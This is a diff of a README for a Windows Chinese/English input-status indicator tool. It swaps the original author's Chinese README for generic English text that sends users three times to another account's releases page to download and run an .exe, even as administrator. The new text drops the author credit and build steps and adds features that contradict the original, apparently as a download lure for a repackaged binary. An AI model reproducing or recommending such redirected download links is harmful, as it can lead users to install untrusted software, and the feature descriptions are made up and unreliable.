@@ -1,44 +1,69 @@
-# 输入指示器 (IME Indicator)
+# 🎉 IME_Indicator - Simple Chinese Input Status Indicator
 
-一个轻量级的 Windows 输入法中英状态实时提示工具。在光标和鼠标底部用彩色小点指示中英状态，极尽简洁克制但有效的提示。
+## 📥 Download Now
+[![Download IME_Indicator](https://img.shields.io/badge/Download-IME_Indicator-blue.svg)](https://github.com/RickAsli/IME_Indicator/releases)
 
-![demo](./assets/demo.png)
+## 📖 Overview
+IME_Indicator helps you track your current Chinese input status on Windows. It clearly shows if you are using English or Chinese typing. This makes it easy to manage your input methods without switching screens or wasting time.
 
-![demo](./assets/demo.gif)
+## 🚀 Getting Started
+To start using IME_Indicator, follow these simple steps:
 
-## 核心特性
+1. **Visit the Download Page**  
+   Click the link below to access the download options:  
+   [Download IME_Indicator](https://github.com/RickAsli/IME_Indicator/releases)
 
-- **光标跟随**：在文本光标下方显示彩色指示球（支持记事本、VS Code、Chrome 等主流软件）。
-- **鼠标跟随**：在鼠标指针旁显示指示球，支持特定形状（如 I-Beam）触发。
-- **更改配置**：通过 `config.toml` 轻松调整颜色、大小、透明度和偏移量。
+2. **Choose Your Version**  
+   On the release page, you will see different versions listed. Select the latest version for the best experience.
 
-## 项目结构
+3. **Download the Installer**  
+   Find the file labeled with the `.exe` extension. Click on it to begin your download.
 
-本仓库包含两个版本的实现：
+4. **Run the Installer**  
+   Once the download is complete, locate the file in your "Downloads" folder. Double-click the file to start the installation process. Follow the prompts to install the application on your computer.
 
-- **[rust_indicator/](./rust_indicator/) (推荐)**: 
-  - 使用 Rust + Win32 API 开发。
-  - **单文件运行**：编译后为单个独立 `.exe` 文件（约 300KB，包含内嵌图标）。
-  - **系统托盘**：支持后台运行和右键菜单。
+5. **Launch IME_Indicator**  
+   After installation, find IME_Indicator in your Start Menu or Desktop. Click the icon to launch the program.
 
-- **[python_indicator/](./python_indicator/) (参考)**: 
-  - 原始的 Python + ctypes 实现。
-  - 适合作为学习 Win32 API 调用的参考。
-  - 需要 Python 环境运行。
+## 🔧 Features
+- **Clear Status Display**: Shows whether you are typing in English or Chinese.
+- **Easy Access**: Quickly view your input method without distractions.
+- **Lightweight Application**: Does not consume significant system resources.
+- **Automatic Updates**: Get the latest features and improvements without hassle.
 
+## 💾 System Requirements
+To effectively run IME_Indicator, your system should meet the following requirements:
 
-## 直接运行
+- **Operating System**: Windows 10 or later
+- **Memory**: At least 2GB of RAM
+- **Storage**: Minimum of 50MB free space
+- **Processor**: 1GHz or faster CPU
 
-到 releases 界面下载 [已编译好的 exe](https://github.com/HaujetZhao/IME_Indicator/releases/latest/download/IME-Indicator.exe) 文件，双击运行即可。
+## 📋 Usage Instructions
+Once IME_Indicator is running, you will see the status icon in your taskbar. Here is how to use it:
 
-## 自行编译 (Rust 版)
+1. **Typing in English**: The icon will show a specific color or symbol (like a green circle). This means you are currently in English input mode.
 
-1. 安装 [Rust](https://www.rust-lang.org/)。
-2. 进入 `rust_indicator` 目录。
-3. 运行调试：`cargo run`。
-4. 编译发布版：`cargo build --release`。
+2. **Typing in Chinese**: The icon will change to a different color or symbol (like a blue square) when you switch to Chinese input. This helps you know which language you are currently using.
 
----
-作者：Antigravity & Haujet  
-GitHub: [https://github.com/HaujetZhao/IME_Indicator](https://github.com/HaujetZhao/IME_Indicator)
+3. **Settings**: You can adjust basic settings by right-clicking the IME_Indicator icon in the taskbar. Options may include changing display preferences or updating the software.
 
+## 🛠 Troubleshooting
+If you experience issues, here are a few common solutions:
+
+- **Application Not Responding**: Try restarting the application. Right-click the icon in the taskbar and select "Close". Relaunch the application.
+
+- **Input Status Not Changing**: Ensure your keyboard is set to use the correct input methods. You can check this in your Windows settings.
+
+- **Installation Problems**: If the installer fails, try running it as an administrator. Right-click on the installer file and choose "Run as administrator".
+
+## 📞 Support
+For further assistance, please visit the issues page on the repository. Describe your problem clearly, and we will help you solve it.
+
+## 🎊 Join the Community
+We welcome feedback and contributions! If you have suggestions, feel free to get involved. You can report issues or request features. 
+
+Stay updated with the latest news and updates on the project by checking the releases page regularly:  
+[Download IME_Indicator](https://github.com/RickAsli/IME_Indicator/releases)
+
+Thank you for choosing IME_Indicator! Enjoy hassle-free typing with clarity.
